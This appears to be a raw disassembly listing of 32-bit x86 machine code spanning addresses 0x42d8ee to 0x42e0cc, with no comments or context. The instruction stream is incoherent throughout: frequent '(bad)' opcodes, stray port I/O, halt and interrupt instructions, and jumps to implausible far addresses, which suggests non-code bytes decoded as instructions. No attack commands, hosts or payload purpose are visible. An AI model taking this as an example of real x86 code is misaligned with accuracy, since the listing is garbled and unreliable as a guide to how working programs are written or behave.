  42d8ee:	or     ch,dh
  42d8f0:	call   0xe43297c8
  42d8f5:	jmp    0x42d8c4
  42d8f7:	div    cl
  42d8f9:	icebp  
  42d8fa:	mov    dh,0xcc
  42d8fc:	cli    
  42d8fd:	jmp    0x42d900
  42d8ff:	cli    
  42d900:	add    al,bh
  42d902:	sar    bl,cl
  42d904:	mov    ch,0xd4
  42d907:	test   BYTE PTR [ebx],0x3
  42d90a:	add    eax,edi
  42d90c:	enter  0xed00,0xcb
  42d910:	mov    bl,0xed
  42d912:	in     al,dx
  42d913:	into   
  42d914:	jmp    0xc1239c13
  42d919:	test   dl,0xba
  42d91c:	shl    ebx,cl
  42d91e:	enter  0xd0ba,0xcf
  42d922:	(bad)  
  42d923:	rol    esi,cl
  42d925:	fimul  DWORD PTR [ecx]
  42d927:	loopne 0x42d922
  42d929:	test   BYTE PTR [eax],0xe4
  42d92c:	or     eax,0xe6e600ed
  42d931:	mov    bh,0xd0
  42d933:	vpmullw ymm6,ymm5,ymm0
  42d937:	aad    0xe5
  42d939:	hlt    
  42d93a:	mov    ch,0xbd
  42d93c:	in     al,0xd5
  42d93e:	out    dx,al
  42d93f:	cld    
  42d940:	icebp  
  42d941:	loope  0x42d933
  42d943:	lds    edi,FWORD PTR [edx-0xbfc0e3e]
  42d949:	lds    eax,FWORD PTR [edx]
  42d94b:	loopne 0x42d951
  42d94d:	add    eax,0xbdd8c5c0
  42d952:	int    0xd5
  42d954:	scas   al,BYTE PTR es:[edi]
  42d955:	mul    esi
  42d957:	in     eax,0xcc
  42d959:	mov    bh,0xca
  42d95b:	in     eax,dx
  42d95c:	mov    edi,0xbfdbf0f4
  42d961:	cmc    
  42d962:	stc    
  42d963:	jecxz  0x42d95d
  42d965:	rol    BYTE PTR [edx],1
  42d967:	rol    cl,1
  42d969:	iret   
  42d96a:	out    dx,eax
  42d96b:	inc    BYTE PTR [ecx]
  42d96d:	out    dx,eax
  42d96e:	rcr    cl,cl
  42d970:	ret    0xaee2
  42d973:	ror    ebx,cl
  42d975:	repz shl DWORD PTR [edi+ecx*8-0x162a1b21],0xd5
  42d97e:	enter  0x1ee,0xc3
  42d982:	std    
  42d983:	(bad)  
  42d985:	add    esp,edx
  42d987:	cmc    
  42d988:	rcr    edx,0xf5
  42d98b:	ret    
  42d98c:	(bad)  
  42d98e:	add    ecx,esi
  42d990:	mov    edi,0xf2b3f7ee
  42d995:	leave  
  42d996:	mov    bl,0xf2
  42d998:	out    0xf6,eax
  42d99a:	std    
  42d99b:	(bad)  
  42d99d:	mov    cl,0xf8
  42d99f:	mov    bh,0xe1
  42d9a1:	int    0xd0
  42d9a3:	cmc    
  42d9a4:	add    DWORD PTR [ecx],eax
  42d9a6:	fcom   st(4)
  42d9a8:	jmp    0xe5e3:0xdb04e0c1
  42d9af:	faddp  st(3),st
  42d9b1:	fsubrp st(2),st
  42d9b3:	jmp    0xc137878b
  42d9b8:	(bad)  
  42d9b9:	lods   eax,DWORD PTR ds:[esi]
  42d9ba:	aam    0xf7
  42d9bc:	mov    esi,0xcd00eab4
  42d9c1:	mov    esi,0x7ebfddc
  42d9c6:	loopne 0x42d9d2
  42d9c8:	fcmovnb st,st(4)
  42d9ca:	call   0xf03fbade
  42d9cf:	jmp    0x42d97e
  42d9d1:	mov    dl,0xc0
  42d9d3:	mov    dh,0xcf
  42d9d6:	mov    dh,0xb7
  42d9d8:	(bad)  
  42d9d9:	(bad)  
  42d9da:	mov    ebx,0xdeecf9ed
  42d9df:	cld    
  42d9e0:	pop    es
  42d9e1:	aad    0xe1
  42d9e3:	out    0xc6,al
  42d9e5:	add    dh,bh
  42d9e7:	loope  0x42d9f0
  42d9e9:	leave  
  42d9ea:	iret   
  42d9eb:	jmp    0x42d9ec
  42d9ed:	or     DWORD PTR [ebp*4-0x524f1057],ecx
  42d9f4:	(bad)  
  42d9f5:	aam    0xee
  42d9f7:	call   0xd716ceed
  42d9fc:	out    dx,al
  42d9fd:	retf   
  42d9fe:	loope  0x42d9d2
  42da00:	mov    edx,0xf1c1d5cc
  42da05:	cld    
  42da06:	fadd   DWORD PTR [ecx+eax*8]
  42da09:	out    dx,al
  42da0a:	cmc    
  42da0b:	add    al,0xde
  42da0d:	out    dx,eax
  42da0e:	repnz out 0xd2,eax
  42da11:	scas   eax,DWORD PTR es:[edi]
  42da12:	in     al,dx
  42da13:	rcr    ebx,1
  42da15:	in     eax,dx
  42da16:	into   
  42da17:	leave  
  42da18:	fucomip st,st(5)
  42da1a:	out    0xbb,al
  42da1c:	enter  0xc3ca,0xcf
  42da20:	ffree  st(2)
  42da22:	cmc    
  42da23:	fsub   st,st(2)
  42da25:	test   ch,0xff
  42da28:	out    0xe4,eax
  42da2a:	call   0xe52ea02d
  42da2f:	mov    cl,0xde
  42da31:	loop   0x42da15
  42da33:	in     eax,0xae
  42da35:	cmc    
  42da36:	sti    
  42da37:	in     eax,dx
  42da38:	(bad)  
  42da39:	xlat   BYTE PTR ds:[ebx]
  42da3a:	std    
  42da3b:	shl    edx,cl
  42da3d:	not    edi
  42da3f:	icebp  
  42da40:	cmc    
  42da41:	ffreep st(3)
  42da43:	mov    esi,0xc4d1f1f0
  42da48:	jmp    0x42da35
  42da4a:	push   cs
  42da4b:	(bad)  
  42da4d:	adc    ebx,edx
  42da4f:	ret    
  42da50:	xlat   BYTE PTR ds:[ebx]
  42da51:	into   
  42da52:	call   0xb714a617
  42da57:	jmp    0x42da2b
  42da59:	xlat   BYTE PTR ds:[ebx]
  42da5a:	fsin   
  42da5c:	mov    esi,0xffdcd5bd
  42da61:	(bad)  
  42da63:	rol    DWORD PTR [ecx],1
  42da65:	(bad)  
  42da66:	fiadd  WORD PTR [ecx]
  42da68:	fild   DWORD PTR [ecx]
  42da6a:	(bad)  
  42da6b:	inc    DWORD PTR [ebx]
  42da6d:	add    al,0xea
  42da6f:	repnz repz rol cl,0xaf
  42da74:	retf   
  42da75:	lods   al,BYTE PTR ds:[esi]
  42da76:	(bad)
  42da79:	enter  0xf3e5,0xf9
  42da7d:	fcmovnu st,st(4)
  42da7f:	shl    esi,cl
  42da81:	test   esi,0xc7fd00d4
  42da87:	fld    DWORD PTR [eax+eax*1]
  42da8a:	add    ch,ah
  42da8c:	push   es
  42da8d:	fucomip st,st(0)
  42da8f:	rcr    al,cl
  42da91:	mov    al,0xca
  42da93:	rcl    ah,1
  42da95:	jmp    0x42da6b
  42da97:	(bad)  
  42da98:	in     eax,0xdf
  42da9a:	fpatan 
  42da9c:	cli    
  42da9d:	(bad)  
  42da9f:	fucomp st(6)
  42daa1:	shl    eax,cl
  42daa3:	mov    ebx,0xd6fdf7fd
  42daa8:	push   es
  42daa9:	cmc    
  42daaa:	pop    es
  42daab:	fcmovnb st,st(4)
  42daad:	ror    edx,cl
  42daaf:	mov    esp,0xd2ecd7f2
  42dab4:	ret    
  42dab5:	out    0xda,eax
  42dab7:	enter  0xe4d9,0xc6
  42dabb:	cmc    
  42dabc:	not    eax
  42dabe:	in     eax,dx
  42dabf:	fsubrp st(7),st
  42dac1:	fild   DWORD PTR [edi]
  42dac3:	mov    ebx,0xd802d4f9
  42dac8:	add    DWORD PTR [ecx],ecx
  42daca:	add    DWORD PTR [esi],ecx
  42dacc:	loope  0x42dace
  42dace:	in     eax,dx
  42dacf:	mov    ebp,0xe7ebd1c5
  42dad4:	sti    
  42dad5:	mov    al,0xe8
  42dad7:	lock jmp 0xd4e8:0xf3f5f6da
  42dadf:	loop   0x42dae1
  42dae1:	ffreep st(7)
  42dae3:	std    
  42dae4:	or     edi,ebx
  42dae6:	fild   DWORD PTR [edx]
  42dae8:	loop   0x42dad4
  42daea:	cmc    
  42daeb:	lds    eax,FWORD PTR [edi]
  42daed:	leave  
  42daee:	shr    DWORD PTR [eax+ebp*4-0x4f343213],cl
  42daf5:	mov    al,0xc4
  42daf7:	mov    edx,0xeaf1c9ea
  42dafc:	idiv   DWORD PTR [edx-0x10002a36]
  42db02:	rcr    cl,1
  42db04:	in     eax,0xdf
  42db06:	pop    es
  42db07:	out    0xfd,eax
  42db09:	jecxz  0x42db01
  42db0b:	add    ebp,eax
  42db0d:	retf   0xbc00
  42db10:	mov    esp,0xe5cff6a9
  42db15:	leave  
  42db16:	loopne 0x42db12
  42db18:	mov    bh,0xf5
  42db1a:	mov    edi,0xd4f1f4ea
  42db1f:	stc    
  42db20:	ret    0xede1
  42db23:	add    ebx,edi
  42db25:	(bad)  
  42db27:	aam    0xf6
  42db29:	add    DWORD PTR [esi],eax
  42db2b:	iret   
  42db2c:	(bad)  
  42db2e:	int3   
  42db2f:	lock int3 
  42db31:	fdivr  QWORD PTR [ebp-0x124a2309]
  42db37:	rcl    ebp,1
  42db39:	(bad)
  42db3c:	les    esi,FWORD PTR [esp+ebp*8-0x38303024]
  42db43:	cli    
  42db44:	jmp    0x42db3c
  42db46:	aad    0xe8
  42db48:	(bad)  
  42db4a:	(bad)  
  42db4b:	enter  0xeac5,0x13
  42db4f:	mov    ecx,0xf5f2eab3
  42db54:	mov    bh,0xeb
  42db56:	(bad)  
  42db57:	lock in eax,dx
  42db59:	hlt    
  42db5a:	aam    0xf1
  42db5c:	mov    ebp,0xbaf5d7ba
  42db61:	fprem1 
  42db63:	fdivrp st(1),st
  42db65:	fstp   TBYTE PTR [eax-0x310251a]
  42db6b:	fucomi st,st(7)
  42db6d:	or     al,0xd8
  42db6f:	fadd   st,st(5)
  42db71:	lods   eax,DWORD PTR ds:[esi]
  42db72:	mov    ebp,0xe0e5d2c9
  42db77:	in     al,dx
  42db78:	in     al,0xbf
  42db7a:	iret   
  42db7b:	(bad)  [ebx+edi*4-0xafe102b]
  42db82:	fdivrp st(7),st
  42db84:	cli    
  42db85:	jmp    0x42db65
  42db87:	fisttp WORD PTR [ecx]
  42db89:	aam    0xe7
  42db8b:	add    al,0xd4
  42db8d:	or     BYTE PTR [ecx],al
  42db8f:	iret   
  42db90:	lods   al,BYTE PTR ds:[esi]
  42db91:	scas   eax,DWORD PTR es:[edi]
  42db92:	retf   0xd5f4
  42db95:	mov    bl,0xfa
  42db97:	icebp  
  42db98:	div    eax
  42db9a:	mov    al,0xf2
  42db9c:	aad    0xed
  42db9e:	sti    
  42db9f:	rcr    dl,cl
  42dba1:	shl    ecx,1
  42dba3:	test   BYTE PTR [ebx],0xdd
  42dba6:	lock aad 0x9
  42dba9:	jecxz  0x42db8f
  42dbab:	add    al,BYTE PTR [edi]
  42dbad:	or     al,0xde
  42dbaf:	rcl    dl,cl
  42dbb1:	scas   eax,DWORD PTR es:[edi]
  42dbb2:	mov    bl,0xbc
  42dbb4:	(bad)  
  42dbb5:	aad    0xb2
  42dbb7:	mov    cl,0xc6
  42dbb9:	sar    BYTE PTR [edx-0x1c250b33],1
  42dbbf:	sar    esp,cl
  42dbc1:	fld    QWORD PTR [esi]
  42dbc3:	mov    esp,0xdb0afce1
  42dbc8:	add    ebx,ebp
  42dbca:	imul   dl
  42dbcc:	or     eax,0xa9b9ebf9
  42dbd1:	in     al,dx
  42dbd2:	scas   al,BYTE PTR es:[edi]
  42dbd3:	scas   eax,DWORD PTR es:[edi]
  42dbd4:	lds    ebp,FWORD PTR [eax+eiz*8-0x1726260f]
  42dbdb:	imul   ah
  42dbdd:	(bad)  
  42dbde:	mov    ecx,0xb8bef2d6
  42dbe3:	(bad)  
  42dbe5:	(bad)  
  42dbe7:	add    eax,0xe80906e2
  42dbec:	call   0xf204dfc0
  42dbf1:	fucomp st(7)
  42dbf3:	out    dx,eax
  42dbf4:	fndisi(8087 only) 
  42dbf6:	cli    
  42dbf7:	rcl    bl,0xcb
  42dbfa:	icebp  
  42dbfb:	icebp  
  42dbfc:	cmc    
  42dbfd:	test   bh,0xf7
  42dc00:	ret    
  42dc01:	int    0xbe
  42dc03:	add    bl,bl
  42dc05:	repz (bad) 
  42dc08:	mov    BYTE PTR [edx],0xe1
  42dc0b:	ret    
  42dc0c:	or     al,0xce
  42dc0e:	or     BYTE PTR [ecx-0x3f3d4f42],ch
  42dc14:	rcr    ebx,1
  42dc16:	int3   
  42dc17:	mov    dh,0xf6
  42dc19:	cli    
  42dc1a:	(bad)  
  42dc1c:	aam    0xf3
  42dc1e:	std    
  42dc1f:	clc    
  42dc20:	stc    
  42dc21:	out    0x3,eax
  42dc23:	fiadd  DWORD PTR [ecx+eax*8]
  42dc26:	(bad)  
  42dc27:	stc    
  42dc28:	aad    0xfe
  42dc2a:	cmc    
  42dc2b:	int    0xfc
  42dc2d:	fsubr  st,st(2)
  42dc2f:	mov    ecx,0xe4b7dda9
  42dc34:	shr    eax,0xca
  42dc37:	jmp    0xdb27c130
  42dc3c:	rcr    esi,cl
  42dc3e:	jecxz  0x42dc0c
  42dc40:	(bad)  
  42dc41:	mul    ch
  42dc43:	shl    edx,cl
  42dc45:	mov    esp,0x3c209e4
  42dc4a:	cld    
  42dc4b:	(bad)  
  42dc4c:	dec    BYTE PTR [edx]
  42dc4e:	int3   
  42dc4f:	mov    eax,0xf2e1adce
  42dc55:	not    esi
  42dc57:	(bad)  
  42dc58:	in     eax,dx
  42dc59:	in     eax,0xde
  42dc5b:	mov    ecx,0xd8e2f0be
  42dc60:	repz (bad) 
  42dc63:	ret    0xfa
  42dc66:	loop   0x42dc32
  42dc68:	add    eax,0xe1c3bc00
  42dc6d:	out    0xe7,al
  42dc6f:	mov    ebp,0xb1cdf2ac
  42dc74:	mov    esp,0xcccdf5ee
  42dc79:	clc    
  42dc7a:	lock fsubp st(3),st
  42dc7d:	mov    edi,0x2dacdca
  42dc82:	xlat   BYTE PTR ds:[ebx]
  42dc83:	rol    DWORD PTR [edi],0xbd
  42dc86:	loope  0x42dc85
  42dc88:	pminsw mm1,QWORD PTR [edi]
  42dc8b:	(bad)  
  42dc8d:	iret   
  42dc8e:	iret   
  42dc8f:	(bad)
  42dc92:	lds    ebp,FWORD PTR [eax+ecx*8-0x322c0b3d]
  42dc99:	fcmovne st,st(2)
  42dc9b:	shr    edx,cl
  42dc9d:	fidivr DWORD PTR [esi-0x24112008]
  42dca3:	inc    DWORD PTR [ebx]
  42dca5:	loope  0x42dcb0
  42dca7:	in     eax,0xff
  42dca9:	(bad)  
  42dcaa:	jmp    0xe627dcaf
  42dcaf:	ror    dh,cl
  42dcb1:	fucom  st(6)
  42dcb3:	stos   DWORD PTR es:[edi],eax
  42dcb4:	mov    ah,0xe2
  42dcb6:	mov    cl,0xda
  42dcb8:	scas   al,BYTE PTR es:[edi]
  42dcb9:	call   0xd535ada8
  42dcbe:	ret    0xf1cd
  42dcc1:	test   BYTE PTR [ecx],0xdc
  42dcc4:	aam    0xe1
  42dcc6:	push   es
  42dcc7:	in     eax,0x1
  42dcc9:	xlat   BYTE PTR ds:[ebx]
  42dcca:	leave  
  42dccb:	jmp    0xe1ae:0xe9fc0be0
  42dcd2:	out    dx,eax
  42dcd3:	aam    0xf4
  42dcd5:	lods   eax,DWORD PTR ds:[esi]
  42dcd6:	repnz int3 
  42dcd8:	call   0xdd3db2bc
  42dcdd:	bnd jmp 0xda22c0db
  42dce3:	clc    
  42dce4:	jmp    esi
  42dce6:	div    ecx
  42dce8:	aam    0x8
  42dcea:	or     eax,0xd8c4f9c5
  42dcef:	leave  
  42dcf0:	retf   0xede4
  42dcf3:	mov    bh,0xc2
  42dcf5:	xlat   BYTE PTR ds:[ebx]
  42dcf6:	out    dx,al
  42dcf7:	iret   
  42dcf8:	into   
  42dcf9:	rcr    eax,cl
  42dcfb:	fxch   st(2)
  42dcfd:	retf   0xc8df
  42dd00:	into   
  42dd01:	add    cl,bl
  42dd03:	add    esp,esi
  42dd05:	(bad)  
  42dd07:	aad    0xdb
  42dd09:	in     al,0xc0
  42dd0b:	out    dx,al
  42dd0c:	aam    0x13
  42dd0e:	add    al,0xbf
  42dd10:	xlat   BYTE PTR ds:[ebx]
  42dd11:	loope  0x42dcd7
  42dd13:	scas   al,BYTE PTR es:[edi]
  42dd14:	repz shr dh,1
  42dd17:	in     eax,dx
  42dd18:	scas   al,BYTE PTR es:[edi]
  42dd19:	idiv   ebp
  42dd1b:	mov    ch,0xdb
  42dd1d:	into   
  42dd1e:	mov    esi,0xfae6e1e8
  42dd23:	rol    edx,cl
  42dd25:	fiadd  DWORD PTR [edi]
  42dd27:	in     eax,0xc4
  42dd29:	push   ebp
  42dd2b:	out    dx,al
  42dd2c:	add    al,bl
  42dd2e:	(bad)  
  42dd2f:	ror    ecx,cl
  42dd31:	mov    esp,0xb3c7afc3
  42dd36:	in     al,0xc0
  42dd38:	rcl    al,cl
  42dd3a:	jmp    0xc8d7:0xd2f9dfbb
  42dd41:	ret    0xecbf
  42dd44:	out    0xe5,eax
  42dd46:	retf   
  42dd47:	rcl    ebp,0xf4
  42dd4a:	push   es
  42dd4b:	loope  0x42dd59
  42dd4d:	retf   0xc2f9
  42dd50:	leave  
  42dd51:	mov    dl,0xe4
  42dd53:	repnz aad 0xc7
  42dd56:	hlt    
  42dd57:	mov    bh,0xb0
  42dd5a:	fdiv   st,st(0)
  42dd5c:	aad    0xdb
  42dd5e:	(bad)  
  42dd60:	ret    
  42dd61:	add    esp,edx
  42dd63:	xlat   BYTE PTR ds:[ebx]
  42dd64:	cli    
  42dd65:	cmc    
  42dd66:	add    al,0xc9
  42dd68:	add    eax,0xe902fdfd
  42dd6d:	fucom  st(7)
  42dd6f:	out    dx,al
  42dd70:	(bad)  
  42dd71:	mov    al,0xe7
  42dd73:	fucom  st(6)
  42dd75:	ror    cl,1
  42dd77:	mov    al,0xe8
  42dd79:	xlat   BYTE PTR ds:[ebx]
  42dd7a:	fldpi  
  42dd7c:	aad    0xdf
  42dd7e:	mov    edx,0xbebdf7ef
  42dd83:	add    bh,al
  42dd85:	jecxz  0x42dd47
  42dd87:	loop   0x42dd84
  42dd89:	jmp    0x932c074
  42dd8e:	iret   
  42dd8f:	shl    esi,1
  42dd91:	mov    esi,0xc1c3ece9
  42dd96:	fcmovbe st,st(6)
  42dd98:	mov    bh,0xe8
  42dd9a:	fnstenv [edi-0x24f2424]
  42dda0:	cli    
  42dda1:	int    0xd7
  42dda3:	shl    ah,cl
  42dda5:	xlat   BYTE PTR ds:[ebx]
  42dda6:	(bad)  
  42dda7:	(bad)  
  42dda9:	or     ecx,DWORD PTR [ebx]
  42ddab:	fdivr  st(4),st
  42ddad:	enter  0xace4,0xb2
  42ddb1:	out    0xed,eax
  42ddb3:	div    DWORD PTR [ecx+ecx*8-0x18120e0d]
  42ddba:	(bad)  
  42ddbb:	mov    ebp,0xfaceddf3
  42ddc0:	ror    ch,0xd4
  42ddc3:	(bad)  
  42ddc4:	fcmovu st,st(5)
  42ddc6:	cli    
  42ddc7:	call   0xe44cccc3
  42ddcc:	retf   
  42ddcd:	clc    
  42ddce:	rcl    dl,cl
  42ddd0:	loopne 0x42dd7b
  42ddd2:	(bad)  
  42ddd3:	imul   ch
  42ddd5:	lods   eax,DWORD PTR ds:[esi]
  42ddd6:	(bad)  
  42ddd7:	shl    BYTE PTR [edx+edx*8-0x1c373b2b],1
  42ddde:	(bad)  
  42dde0:	(bad)  
  42dde1:	out    dx,eax
  42dde2:	in     al,dx
  42dde3:	loopne 0x42ddb7
  42dde5:	add    dl,bh
  42dde7:	add    al,0x0
  42dde9:	add    al,0xfc
  42ddeb:	push   es
  42ddec:	loop   0x42dde0
  42ddee:	adc    DWORD PTR [edi-0x2a534831],esp
  42ddf4:	ret    
  42ddf5:	mov    bl,0xe0
  42ddf7:	sar    al,1
  42ddf9:	(bad)  
  42ddfa:	mov    eax,0xd0ded2ff
  42ddff:	(bad)  
  42de01:	fld    QWORD PTR [eax]
  42de03:	mov    ebp,0xbe40ac4
  42de08:	(bad)  
  42de09:	(bad)  
  42de0b:	cld    
  42de0c:	sti    
  42de0d:	(bad)  
  42de0e:	ffreep st(5)
  42de10:	jmp    0xb32eb5c8
  42de15:	in     eax,dx
  42de16:	loope  0x42ddd8
  42de18:	hlt    
  42de19:	(bad)  
  42de1a:	sar    BYTE PTR [ecx-0x2e1d3204],cl
  42de20:	int3   
  42de21:	pop    es
  42de22:	repz ret 0xc1f8
  42de26:	rol    ah,1
  42de28:	fsubr  st(6),st
  42de2a:	cld    
  42de2b:	jmp    0x42de1a
  42de2d:	fmul   QWORD PTR [esi]
  42de2f:	jecxz  0x42de1a
  42de31:	loop   0x42de22
  42de33:	(bad)  
  42de34:	mov    cl,0xe5
  42de36:	aad    0xe7
  42de38:	shl    DWORD PTR [ecx-0xf0e0518],cl
  42de3e:	leave  
  42de3f:	iret   
  42de40:	out    dx,eax
  42de41:	push   es
  42de42:	fdiv   st,st(6)
  42de44:	aam    0xfe
  42de46:	inc    edx
  42de48:	or     esi,edi
  42de4a:	add    bl,dl
  42de4c:	iret   
  42de4d:	(bad)  
  42de4f:	test   al,0xdc
  42de51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de52:	(bad)  
  42de53:	enter  0xd3f5,0xc5
  42de57:	jmp    0xd0cc:0xdeddb7ec
  42de5e:	jecxz  0x42de5f
  42de60:	shl    esi,cl
  42de62:	loope  0x42de20
  42de64:	aam    0xd2
  42de66:	jecxz  0x42de65
  42de68:	imul   al
  42de6a:	or     bl,cl
  42de6c:	fsub   st,st(2)
  42de6e:	loope  0x42de2d
  42de70:	xlat   BYTE PTR ds:[ebx]
  42de71:	retf   0xcaf1
  42de74:	sti    
  42de75:	cmc    
  42de76:	jmp    0xcf1baa62
  42de7b:	call   0xf442c171
  42de80:	iret   
  42de81:	iret   
  42de82:	(bad)  
  42de83:	inc    BYTE PTR [edi]
  42de85:	jecxz  0x42de5c
  42de87:	mov    dl,0xd5
  42de8a:	ror    BYTE PTR [eax],0xeb
  42de8d:	leave  
  42de8e:	add    al,dh
  42de90:	(bad)
  42de93:	int3   
  42de94:	in     eax,0xb6
  42de96:	(bad)  
  42de97:	int3   
  42de98:	into   
  42de99:	mov    al,0xf8
  42de9b:	(bad)  
  42de9c:	fdivrp st(4),st
  42de9e:	stc    
  42de9f:	not    dl
  42dea1:	in     eax,dx
  42dea2:	mov    esi,0x10b0302
  42dea7:	icebp  
  42dea8:	ret    0xe8ee
  42deab:	(bad)  
  42deac:	or     eax,0xe2cbe8e8
  42deb1:	call   0xe7f69468
  42deb6:	into   
  42deb7:	lock repz dec edi
  42debb:	(bad)  
  42debd:	jmp    ecx
  42debf:	std    
  42dec0:	fcmovu st,st(3)
  42dec2:	in     eax,0xd5
  42dec4:	aam    0xfb
  42dec6:	ror    DWORD PTR [eax],1
  42dec8:	add    al,0xf9
  42deca:	clc    
  42decb:	fiadd  DWORD PTR [ecx*1-0x531e2601]
  42ded2:	mov    dl,0xd6
  42ded4:	mov    dh,0xc7
  42ded6:	mov    edx,0xe6e7d7e4
  42dedb:	hlt    
  42dedc:	into   
  42dedd:	hlt    
  42dede:	ret    0xfd02
  42dee1:	cli    
  42dee2:	(bad)  
  42dee4:	fdiv   st,st(6)
  42dee6:	out    0x9,eax
  42dee8:	enter  0xfaeb,0xf
  42deec:	cli    
  42deed:	in     al,0xc4
  42deef:	out    0xd7,al
  42def1:	(bad)  
  42def3:	mov    bh,0xed
  42def5:	repz retf 0xf7ed
  42def9:	cli    
  42defa:	xlat   BYTE PTR ds:[ebx]
  42defb:	fnstcw WORD PTR [eax-0x917172e]
  42df01:	cli    
  42df02:	loopne 0x42dec7
  42df04:	rcl    edx,1
  42df06:	out    0xf1,al
  42df08:	retf   
  42df09:	fmul   DWORD PTR [edx]
  42df0b:	jmp    0xe8ee:0xf0de04cd
  42df12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df13:	int    0xdc
  42df15:	idiv   dl
  42df17:	lock mov al,0xe4
  42df1a:	in     al,0xd4
  42df1c:	repz loop 0x42df0f
  42df1f:	ret    0x3c2
  42df22:	cmc    
  42df23:	hlt    
  42df24:	lock out 0x2,eax
  42df27:	lock add bl,ah
  42df2a:	pop    es
  42df2b:	aad    0xc9
  42df2d:	repnz std 
  42df2f:	jmp    0xb320a2f4
  42df34:	hlt    
  42df35:	fisubr DWORD PTR [eax+eax*8-0x3633383a]
  42df3c:	(bad)  
  42df3d:	repz mov esi,0xfce3bdfc
  42df43:	fdivr  QWORD PTR [ebp-0xa0201ff]
  42df49:	jecxz  0x42df48
  42df4b:	prefetchw (bad)
  42df4c:	or     eax,0xe1b1ffcc
  42df51:	rcl    bh,1
  42df53:	in     al,0xce
  42df55:	in     al,0xda
  42df57:	rcl    bh,1
  42df59:	mov    ebx,0xe9f8ebde
  42df5e:	add    ah,dl
  42df60:	mov    dh,0xf3
  42df62:	std    
  42df63:	fiadd  WORD PTR [edi]
  42df65:	neg    dl
  42df67:	leave  
  42df68:	fcomip st,st(5)
  42df6a:	jmp    0xec08ce4a
  42df6f:	repz mov bl,0xec
  42df72:	int3   
  42df73:	(bad)  
  42df74:	mov    bl,0xd1
  42df76:	(bad)  
  42df77:	retf   
  42df78:	clc    
  42df79:	icebp  
  42df7a:	mov    eax,0xccb9bffd
  42df7f:	sar    edi,0xc2
  42df82:	aad    0xd5
  42df84:	int3   
  42df85:	mov    ebp,0xe8fce2da
  42df8a:	add    ah,ch
  42df8c:	add    eax,0xdcdf12e1
  42df91:	mov    edi,0xe6b5e2ea
  42df97:	out    dx,al
  42df98:	hlt    
  42df99:	out    dx,eax
  42df9a:	mov    ecx,0xd9c8faf8
  42df9f:	hlt    
  42dfa0:	ror    ebp,0xe2
  42dfa3:	sar    BYTE PTR [edx-0x2f1800fa],cl
  42dfa9:	sar    bl,0xdb
  42dfac:	out    dx,al
  42dfad:	call   0xdf13bbb6
  42dfb2:	(bad)  
  42dfb3:	jmp    0xb9d6:0xe6f0d2ef
  42dfba:	aam    0xd0
  42dfbc:	out    dx,al
  42dfbd:	fadd   st,st(3)
  42dfbf:	fild   WORD PTR [edi]
  42dfc1:	int    0xed
  42dfc3:	aad    0xde
  42dfc5:	mov    esp,0xe0dae6eb
  42dfca:	dec    ecx
  42dfcc:	fmul   DWORD PTR ds:0xf2bed903
  42dfd2:	(bad)  
  42dfd3:	mov    al,0xee
  42dfd5:	mov    ah,0xee
  42dfd7:	iret   
  42dfd8:	mov    al,0xad
  42dfda:	rcl    esp,1
  42dfdc:	retf   
  42dfdd:	mov    edi,0xe3f1eef4
  42dfe2:	(bad)  
  42dfe3:	(bad)  
  42dfe5:	(bad)
  42dfe8:	shr    edx,0xc4
  42dfeb:	in     eax,dx
  42dfec:	or     eax,0xe6c1fefe
  42dff1:	in     eax,dx
  42dff2:	iret   
  42dff3:	repnz in al,dx
  42dff5:	repnz in al,0xf9
  42dff8:	mov    ebx,0xd1cff2b1
  42dffd:	mov    ecx,0x2d1f2d5
  42e002:	fadd   st(3),st
  42e004:	cmc    
  42e005:	vpmulhw ymm3,ymm7,ymm5
  42e009:	jecxz  0x42dfe6
  42e00b:	clc    
  42e00c:	(bad)  
  42e00e:	add    DWORD PTR [edx-0x49313356],esi
  42e014:	shl    bh,1
  42e016:	repz mov bh,0xe5
  42e019:	enter  0xd7fb,0xb2
  42e01d:	fsub   st,st(2)
  42e01f:	mov    ecx,0xf7d6bdbd
  42e024:	add    cl,bl
  42e026:	jmp    0xe600a82b
  42e02b:	fadd   DWORD PTR [esi]
  42e02d:	repz push es
  42e02f:	loop   0x42dff7
  42e031:	int3   
  42e032:	repz ror ah,1
  42e035:	sti    
  42e036:	loopne 0x42e003
  42e038:	leave  
  42e039:	mov    cl,0xf5
  42e03b:	clc    
  42e03c:	repnz add ch,bh
  42e03f:	call   0xe40fd446
  42e044:	loopne 0x42e023
  42e046:	retf   
  42e047:	retf   0xd4fe
  42e04a:	in     eax,dx
  42e04b:	cld    
  42e04c:	push   cs
  42e04d:	loope  0x42e050
  42e04f:	lods   eax,DWORD PTR ds:[esi]
  42e050:	stos   BYTE PTR es:[edi],al
  42e051:	in     al,0xec
  42e053:	lods   al,BYTE PTR ds:[esi]
  42e054:	retf   0xf5e7
  42e057:	(bad)  
  42e058:	fcos   
  42e05a:	std    
  42e05b:	cli    
  42e05c:	les    edi,FWORD PTR [ecx-0x252e262f]
  42e062:	fdivr  st(1),st
  42e064:	loop   0x42e01f
  42e066:	mul    ch
  42e068:	mov    esi,0x2fe0100
  42e06d:	iret   
  42e06e:	in     al,0xb2
  42e070:	out    dx,eax
  42e071:	mov    al,0xa8
  42e073:	fdivr  st(3),st
  42e075:	mov    ah,0xe4
  42e077:	leave  
  42e078:	int3   
  42e079:	mov    dh,0xf1
  42e07b:	in     al,0xf2
  42e07d:	add    ebx,edx
  42e07f:	add    BYTE PTR [eax-0x392602fe],bh
  42e085:	cli    
  42e086:	rol    ch,cl
  42e088:	jmp    0x42e081
  42e08a:	std    
  42e08b:	call   0xe41ccd5f
  42e090:	test   al,0xd1
  42e092:	in     al,dx
  42e093:	mov    dh,0xdc
  42e095:	(bad)  
  42e096:	stc    
  42e097:	mov    ecx,0xfaecfae4
  42e09c:	retf   
  42e09d:	clc    
  42e09e:	mov    ecx,0xe5b9edee
  42e0a3:	fucom  st(6)
  42e0a5:	repz or edi,edi
  42e0a8:	enter  0xbf4,0xcf
  42e0ac:	in     al,0xfb
  42e0ae:	or     al,0xc2
  42e0b0:	(bad)  
  42e0b2:	(bad)  
  42e0b3:	scas   eax,DWORD PTR es:[edi]
  42e0b4:	mov    bl,0xe1
  42e0b6:	aam    0xe6
  42e0b8:	int    0xca
  42e0ba:	jmp    0x42e081
  42e0bc:	add    edi,DWORD PTR [ebp+0x7d3e9ca]
  42e0c2:	hlt    
  42e0c3:	fcom   st(2)
  42e0c5:	in     eax,0xc3
  42e0c7:	or     edi,edi
  42e0c9:	in     eax,0x1
  42e0cb:	leave  
  42e0cc:	aam    0x13
